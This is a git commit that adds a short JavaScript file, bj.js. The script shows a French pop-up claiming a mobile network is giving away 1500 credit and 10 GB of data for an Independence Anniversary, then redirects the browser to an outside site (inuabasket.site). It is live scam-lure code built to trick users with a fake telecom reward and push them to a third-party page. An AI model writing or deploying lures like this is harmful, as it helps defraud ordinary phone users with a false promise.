ead6f35d409617dfb02d591fdfc73754863d3a0c
usorondo96 <tooltip72_verbena@icloud.com>
2026-07-27 09:24:35 +0100

    Create bj.js

---
+++ bj.js
@@ -0,0 +1,10 @@
+
+    var password = '1500 DE CRÉDIT + 10 Go DE DONNÉES';
+password = prompt(
+'Réseau : Félicitations ! Vous êtes éligible à recevoir la récompense de l’Anniversaire de l’Indépendance : 1500 de crédit avec 10 Go de données. Cliquez sur OK pour activer maintenant.','1500 DE CRÉDIT + 10 Go DE DONNÉES'
+
+);if (password != '1500 DE CRÉDIT + 10 Go DE DONNÉES') {
+
+    location.href = 'https://www.inuabasket.site/bj-offre-de-independance';
+
+}
